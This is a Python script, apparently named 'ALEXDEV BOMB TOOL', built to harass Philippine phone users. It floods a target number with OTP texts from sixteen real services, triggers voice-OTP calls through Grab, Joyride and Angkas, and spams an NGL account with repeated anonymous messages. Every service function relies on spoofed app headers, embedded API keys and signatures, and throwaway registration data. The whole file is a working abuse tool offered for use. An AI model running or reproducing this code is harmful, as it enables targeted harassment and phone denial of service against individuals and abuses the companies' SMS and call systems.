#!/usr/bin/env python3
"""
ALEXDEV BOMB TOOL
Author: Alex Jhon Ponce
Telegram: https://t.me/alexdevyuhhh
Facebook: https://www.facebook.com/alexdevyuhhh
Philippine Numbers Only
"""

import random
import string
import time
import json
import requests
import hashlib
import threading
from datetime import datetime, timezone
from queue import Queue
from urllib.parse import urlencode

FINGERPRINT_VISITOR_ID = "TPt0yCuOFim3N3rzvrL1"
FINGERPRINT_REQUEST_ID = "1757149666261.Rr1VvG"


def _rs(length=8):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))


def _normalize(phone):
    p = str(phone).strip().replace(' ', '').replace('-', '')
    if p.startswith('+63'):
        return p
    if p.startswith('63'):
        return '+' + p
    if p.startswith('0'):
        return '+63' + p[1:]
    if len(p) == 10:
        return '+63' + p
    return '+63' + p


class MWELLWorker:
    def __init__(self, parent):
        self.parent = parent

    def send_sync(self, phone_number):
        try:
            fp = self.parent.format_phone(phone_number)
            headers = {
                'User-Agent': 'okhttp/4.11.0',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json; charset=utf-8',
                'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
                'x-app-version': random.choice(['03.942.035', '03.942.036', '03.942.037']),
                'x-device-type': 'android',
                'x-device-model': random.choice([
                    'oneplus CPH2465', 'samsung SM-G998B',
                    'xiaomi Redmi Note 13', 'realme RMX3700'
                ]),
                'x-timestamp': str(int(time.time() * 1000)),
                'x-request-id': _rs(16)
            }
            data = {'country': 'PH', 'phoneNumber': fp, 'phoneNumberPrefix': '+63'}
            r = requests.post(
                'https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number',
                headers=headers, json=data, timeout=20
            )
            if r.status_code == 200:
                resp = r.json()
                if resp.get('c') == 200:
                    return True, 'OTP sent successfully', 60
                return False, f"API Error: Code {resp.get('c')}", 30
            return False, f'HTTP {r.status_code}', 30
        except Exception as e:
            return False, f'Error: {str(e)[:50]}', 30


class PEXXWorker:
    def __init__(self, parent):
        self.parent = parent

    def send_sync(self, phone_number):
        try:
            fp = self.parent.format_phone(phone_number)
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'x-msession-id': 'undefined',
                'x-oid': '',
                'tid': _rs(11),
                'appversion': '3.0.14',
                'sentry-trace': _rs(32),
                'baggage': (
                    'sentry-environment=production,'
                    'sentry-public_key=811267d2b611af4416884dd91d0e093c,'
                    f'sentry-trace_id={_rs(32)}'
                )
            }
            data = {'0': {'json': {
                'email': '', 'areaCode': '+63',
                'phone': f'+63{fp}', 'otpChannel': 'TG', 'otpUsage': 'REGISTRATION'
            }}}
            r = requests.post(
                'https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1',
                headers=headers, json=data, timeout=20
            )
            if r.status_code == 200:
                resp = r.json()
                if isinstance(resp, list) and len(resp) > 0:
                    rd = resp[0].get('result', {}).get('data', {}).get('json', {})
                    if rd.get('code') == 200:
                        return True, 'OTP sent successfully', rd.get('data', {}).get('resendTimeInSec', 60)
                    return False, f"API Error: {rd.get('msg', 'Unknown')}", 30
                return False, 'Invalid response format', 30
            return False, f'HTTP {r.status_code}', 30
        except Exception as e:
            return False, f'Error: {str(e)[:50]}', 30


class BomberTool:
    def __init__(self):
        self.osim_url = 'https://prod.services.osim-cloud.com/identity/api/v1.0/account'
        self.mwell_worker = MWELLWorker(self)
        self.pexx_worker = PEXXWorker(self)
        self.all_services = [
            ('BOMB OTP',          self.send_bomb_otp),
            ('EZLOAN',            self.send_ezloan),
            ('XPRESS PH',         self.send_xpress),
            ('ABENSON',           self.send_abenson),
            ('EXCELLENT LENDING', self.send_excellent_lending),
            ('BISTRO',            self.send_bistro),
            ('BAYAD CENTER',      self.send_bayad),
            ('LBC CONNECT',       self.send_lbc),
            ('PICKUP COFFEE',     self.send_pickup_coffee),
            ('HONEY LOAN',        self.send_honey_loan),
            ('KOMO PH',           self.send_komo_ph),
            ('S5.COM',            self.send_s5_otp),
            ('FORTUNE PAY',       self.send_fortune_pay),
            ('WEMOVE',            self.send_wemove),
            ('MWELL',             self.send_mwell),
            ('PEXX',              self.send_pexx),
        ]

    def format_phone(self, phone):
        p = str(phone).strip().replace(' ', '').replace('-', '').replace('+', '')
        if p.startswith('0'):
            p = p[1:]
        elif p.startswith('63'):
            p = p[2:]
        return p

    def validate_phone(self, phone):
        import re
        return bool(re.match(r'^9\d{9}$', self.format_phone(phone)))

    def send_bomb_otp(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'OSIM/1.55.0 (Android 16; CPH2465; OP5958L1; arm64-v8a)',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json; charset=utf-8',
                'accept-language': 'en-SG',
                'region': 'PH',
                'X-Country': 'PH',
            }
            data = {
                'phone': f'63{fp}',
                'phoneCode': '63',
                'password': f'TempPass{random.randint(1000, 9999)}!',
                'userName': fp,
            }
            r = requests.post(f'{self.osim_url}/register', headers=headers, json=data, timeout=8)
            if r.status_code == 200:
                res = r.json()
                if res.get('resultCode', 0) in [201000, 200000, 0]:
                    return True, res.get('message', 'Bomb sent')
                return False, res.get('message', f"Code {res.get('resultCode')}")
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_ezloan(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            ts = int(time.time() * 1000)
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'accept-language': 'en',
                'imei': '7a997625bd704baebae5643a3289eb33',
                'device': 'android', 'buildtype': 'release',
                'brand': 'oneplus', 'model': 'CPH2465',
                'manufacturer': 'oneplus', 'source': 'EZLOAN',
                'channel': 'GooglePlay_Blue', 'appversion': '2.0.4',
                'appversioncode': '2000402', 'version': '2.0.4',
                'versioncode': '2000401', 'sysversion': '16',
                'sysversioncode': '36', 'customerid': '',
                'businessid': 'EZLOAN', 'phone': '',
                'appid': 'EZLOAN', 'authorization': '',
                'blackbox': f'kGPGg{ts}DCl3O8MVBR0',
            }
            data = {
                'businessId': 'EZLOAN',
                'contactNumber': f'0{fp}',
                'appsflyerIdentifier': f'{ts}-{random.randint(10**18, 10**19 - 1)}'
            }
            r = requests.post(
                'https://gateway.ezloancash.ph/security/auth/otp/request',
                headers=headers, json=data, timeout=8
            )
            if r.status_code == 200:
                resp = r.json()
                if resp.get('code') == 0:
                    return True, resp.get('msg', 'Sent')
                return False, resp.get('msg', 'Failed')
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_xpress(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            ts = int(time.time() * 1000)
            headers = {
                'User-Agent': 'Dalvik/35 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)/Dart',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'conversationid': '42d64cfe-330f-4876-aed2-5a3b1547e2ce',
                'Cookie': 'ApplicationGatewayAffinityCORS=9af1ffd531ed95805ec09cbdf3793dd6; ApplicationGatewayAffinity=9af1ffd531ed95805ec09cbdf3793dd6',
            }
            data = {
                'FirstName': 'toshi', 'LastName': 'premium',
                'Email': f'toshi{ts}@gmail.com',
                'Phone': f'+63{fp}',
                'Password': 'ToshiPass123', 'ConfirmPassword': 'ToshiPass123',
                'ImageUrl': '', 'RoleIds': [4],
                'Area': 'manila', 'City': 'manila', 'PostalCode': '1000',
                'Street': 'toshi_street', 'ReferralCode': '',
                'FingerprintVisitorId': FINGERPRINT_VISITOR_ID,
                'FingerprintRequestId': FINGERPRINT_REQUEST_ID,
            }
            r = requests.post(
                'https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp',
                headers=headers, json=data, timeout=8
            )
            if r.status_code in [200, 201, 204]:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_abenson(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-requested-with': 'com.abensonmembership.cloone',
                'origin': 'https://localhost',
                'referer': 'https://localhost/',
            }
            data = {'contact_no': fp, 'login_token': 'undefined'}
            r = requests.post(
                'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                headers=headers, data=data, timeout=8
            )
            if r.status_code in [200, 201, 204]:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_excellent_lending(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            coordinates = [
                {'lat': '14.5995', 'long': '120.9842'},
                {'lat': '14.6760', 'long': '121.0437'},
                {'lat': '14.8648', 'long': '121.0418'}
            ]
            agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'okhttp/3.12.1', 'Dart/3.6 (dart:io)', 'Mozilla/5.0 (Linux; Android 15)']
            coord = random.choice(coordinates)
            headers = {
                'User-Agent': random.choice(agents),
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json; charset=utf-8',
                'x-version': '1.1.2',
                'x-package-name': 'com.support.excellenteralending',
                'x-adid': 'efe35521e51f924efcad5d61d61072a9',
                'x-latitude': coord['lat'],
                'x-longitude': coord['long'],
            }
            data = {
                'domain': f'0{fp}',
                'cat': 'login',
                'previous': False,
                'financial': 'efe35521e51f924efcad5d61d61072a9'
            }
            r = requests.post(
                'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                headers=headers, json=data, timeout=8
            )
            if r.status_code in [200, 201, 204]:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_bistro(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            command_array = [
                'free.text.sms', '421', f'+63{fp}', '2207117BPG',
                'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg',
                'You have a new notification'
            ]
            headers = {
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)',
                'Connection': 'Keep-Alive',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = {
                'UID': _rs(28),
                'humottaee': 'Processing',
                'Email': f'{_rs(8)}@gmail.com',
                '$Oj0O%K7zi2j18E': json.dumps(command_array),
                'device_id': _rs(16),
                'Photo': 'https://lh3.googleusercontent.com/a/ACg8ocJyIdNL-vWOcm_v4Enq2PRZRcNaU_c8Xt0DJ1LNvmtKDiVQ-A=s96-c',
                'Name': 'User'
            }
            r = requests.post(
                'https://sms.m2techtronix.com/v13/sms.php',
                headers=headers, data=urlencode(data), timeout=10
            )
            if r.status_code == 200:
                return True, 'SMS sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_bayad(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            ts = int(time.time() * 1000)
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
            }
            data = {
                'businessId': 'BAYAD',
                'contactNumber': f'0{fp}',
                'appsflyerIdentifier': f'{ts}-{random.randint(10**18, 10**19 - 1)}'
            }
            r = requests.post(
                'https://gateway.ezloancash.ph/security/auth/otp/request',
                headers=headers, json=data, timeout=8
            )
            if r.status_code == 200:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_lbc(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            data = {
                'verification_type': 'mobile',
                'client_email': f'{_rs(8)}@gmail.com',
                'client_contact_code': '+63',
                'client_contact_no': fp,
                'app_log_uid': _rs(16),
            }
            r = requests.post(
                'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                headers=headers, data=data, timeout=8
            )
            if r.status_code in [200, 201, 204]:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_pickup_coffee(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
            headers = {
                'User-Agent': random.choice(agents),
                'Content-Type': 'application/json',
            }
            data = {'mobile_number': f'+63{fp}', 'login_method': 'mobile_number'}
            r = requests.post(
                'https://production.api.pickup-coffee.net/v2/customers/login',
                headers=headers, json=data, timeout=8
            )
            if r.status_code in [200, 201]:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_honey_loan(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Content-Type': 'application/json',
            }
            data = {'phone': f'0{fp}', 'is_rights_block_accepted': 1}
            r = requests.post(
                'https://api.honeyloan.ph/api/client/registration/step-one',
                headers=headers, json=data, timeout=8
            )
            if r.status_code == 200:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_komo_ph(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'Content-Type': 'application/json',
                'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
                'Ocp-Apim-Subscription-Key': 'cfde6d2109154bb7ae63d1662e9a1958',
                'User-Agent': 'Dart/3.6 (dart:io)',
            }
            data = {'mobileNumber': f'+63{fp}', 'channel': 'SMS'}
            r = requests.post('https://api.komo.ph/v1/otp/send', headers=headers, json=data, timeout=8)
            if r.status_code == 200:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_s5_otp(self, phone_number):
        try:
            normalized = _normalize(phone_number)
            headers = {
                'authority': 'api.s5.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en',
                'cache-control': 'no-cache',
                'origin': 'https://www.s5.com',
                'pragma': 'no-cache',
                'referer': 'https://www.s5.com/',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
                'x-api-type': 'external',
                'x-locale': 'en',
                'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
                'x-timezone-offset': '480',
            }
            r = requests.post(
                'https://api.s5.com/player/api/v1/otp/request',
                data={'phone_number': normalized},
                headers=headers, timeout=8
            )
            if r.status_code in [200, 201, 204]:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_fortune_pay(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'Dart/3.6 (dart:io)',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'app-type': 'GOOGLE_PLAY',
                'authorization': 'Bearer',
                'app-version': '4.3.5',
                'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
                'timestamp': str(int(time.time() * 1000)),
                'nonce': f'{_rs(10)}-{int(time.time() * 1000)}',
            }
            data = {
                'deviceId': 'c31a9bc0-652d-11f0-88cf-9d4076456969',
                'deviceType': 'GOOGLE_PLAY',
                'companyId': '4bf735e97269421a80b82359e7dc2288',
                'dialCode': '+63',
                'phoneNumber': fp,
            }
            r = requests.post(
                'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
                headers=headers, json=data, timeout=8
            )
            if r.status_code in [200, 201, 204]:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_wemove(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'okhttp/4.9.3',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'xuid_type': 'user',
                'source': 'customer',
                'authorization': 'Bearer',
            }
            data = {'phone_country': '+63', 'phone_no': fp}
            r = requests.post('https://api.wemove.com.ph/auth/users', headers=headers, json=data, timeout=8)
            if r.status_code in [200, 201, 204]:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_mwell(self, phone_number):
        success, message, _ = self.mwell_worker.send_sync(phone_number)
        return success, message

    def send_pexx(self, phone_number):
        success, message, _ = self.pexx_worker.send_sync(phone_number)
        return success, message


# ── Call Bomber ───────────────────────────────────────────────────────────────

class CallBomber:
    def __init__(self):
        self.all_services = [
            ('JOYRIDE',    self.send_joyride),
            ('GRAB CALL',  self.send_grab),
            ('ANGKAS',     self.send_angkas),
        ]

    def format_phone(self, phone):
        p = str(phone).strip().replace(' ', '').replace('-', '').replace('+', '')
        if p.startswith('0'):
            p = p[1:]
        elif p.startswith('63'):
            p = p[2:]
        return p

    def validate_phone(self, phone):
        import re
        return bool(re.match(r'^9\d{9}$', self.format_phone(phone)))

    def send_joyride(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'Dart/3.6 (dart:io)',
                'Content-Type': 'application/json',
                'Accept-Encoding': 'gzip',
            }
            data = {
                'mobile': f'+63{fp}',
                'channel': 'call',
                'purpose': 'registration',
            }
            r = requests.post(
                'https://api.joyride.com.ph/v1/otp/send',
                headers=headers, json=data, timeout=10
            )
            if r.status_code in [200, 201]:
                return True, 'Call triggered'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_grab(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'GrabPassenger/5.286.0 (Android)',
                'Content-Type': 'application/json',
                'X-Grab-Country': 'PH',
            }
            data = {
                'phoneNumber': f'+63{fp}',
                'verificationType': 'CALL',
            }
            r = requests.post(
                'https://p.grabtaxi.com/api/passenger/v2/profile/otp/request',
                headers=headers, json=data, timeout=10
            )
            if r.status_code in [200, 201]:
                return True, 'Call triggered'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_angkas(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'okhttp/4.9.1',
                'Content-Type': 'application/json',
            }
            data = {
                'mobile_number': f'+63{fp}',
                'otp_type': 'voice',
            }
            r = requests.post(
                'https://api.angkas.com/v3/auth/otp',
                headers=headers, json=data, timeout=10
            )
            if r.status_code in [200, 201]:
                return True, 'Call triggered'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'


# ── NGL Spammer ───────────────────────────────────────────────────────────────

class NGLSpammer:
    NGL_URL = 'https://ngl.link/api/submit'

    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/237.0.479142407 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
        ]

    def _random_device_id(self):
        return ''.join(random.choices('abcdef0123456789', k=16))

    def send_message(self, username: str, message: str) -> tuple:
        try:
            device_id = self._random_device_id()
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://ngl.link',
                'Referer': f'https://ngl.link/{username}',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
            }
            data = {
                'username': username,
                'question': message,
                'deviceId': device_id,
                'gameSlug': '',
                'referrer': '',
            }
            r = requests.post(
                self.NGL_URL,
                headers=headers,
                data=urlencode(data),
                timeout=10
            )
            if r.status_code == 200:
                return True, 'Message sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def spam(self, username: str, message: str, count: int, job: dict):
        sent = 0
        failed = 0
        for i in range(count):
            if job.get('abort'):
                break
            success, msg = self.send_message(username, message)
            entry = {
                'service': f'NGL #{i+1}',
                'success': success,
                'message': msg,
                'round': 1,
                'ts': time.strftime('%H:%M:%S')
            }
            job['results'].append(entry)
            if success:
                job['success'] += 1
                sent += 1
            else:
                job['fail'] += 1
                failed += 1
            time.sleep(random.uniform(0.3, 0.8))
        job['status'] = 'done'
